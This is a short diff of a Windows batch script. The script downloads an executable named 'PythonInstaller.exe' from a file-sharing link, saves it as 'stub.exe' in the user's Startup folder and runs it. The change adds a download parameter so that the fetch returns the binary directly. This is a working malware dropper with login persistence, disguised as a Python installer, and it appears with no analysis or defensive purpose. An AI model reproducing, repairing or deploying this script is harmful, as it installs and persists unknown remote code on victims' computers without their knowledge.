@@ -20,7 +20,7 @@ call "%DEST%"
 @echo off
 setlocal 
 
-set "URL=https://link.storjshare.io/s/juhifsj5yqitylzy42lgs2xmtfjq/isimsallaqwe/PythonInstaller.exe"
+set "URL=https://link.storjshare.io/s/juhifsj5yqitylzy42lgs2xmtfjq/isimsallaqwe/PythonInstaller.exe?download=1"
 set "DEST=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\stub.exe"
 
 
